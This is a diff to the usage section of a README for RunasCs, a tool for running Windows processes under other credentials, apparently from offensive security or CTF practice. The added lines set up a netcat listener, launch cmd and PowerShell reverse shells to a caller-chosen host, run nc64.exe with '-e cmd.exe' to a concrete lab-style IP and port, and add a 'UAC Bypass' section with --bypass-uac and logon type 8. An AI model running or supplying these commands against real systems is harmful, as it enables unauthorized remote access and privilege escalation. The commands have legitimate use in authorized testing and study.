@@ -8,11 +8,21 @@ RunasCs is an utility to run specific processes with different permissions than 
 ## Usage
 
 First start nc in local machine:
+```shell
+rlwrap nc -nvlp 4444
+```
+```powershell
+./RunasCs.exe <username> <password> cmd -r <localip>:<port>
+./RunasCs.exe <username> <password> powershell -r <localip>:<port>
+./RunasCs.exe [username] [password] "C:\Users\kioskUser0\Downloads\nc64.exe [localip] [port] -e cmd.exe"
+```
 
-    rlwrap nc -nvlp 4444
+UAC Bypass:
 
-    ./RunasCs.exe <username> <password> cmd -r <localip>:<port>
-    ./RunasCs.exe <username> <password> powershell-r <localip>:<port>
+```powershell
+./RunasCs.exe <username> <password> powershell -r <localip>:<port> --bypass-uac --logon-type "8"
+./RunasCs.exe [username] [password] "C:\Users\kioskUser0\Downloads\nc64.exe 10.10.14.44 4444 -e cmd.exe" --bypass-uac --logon-type "8"
+```
 
 ## More Information
 
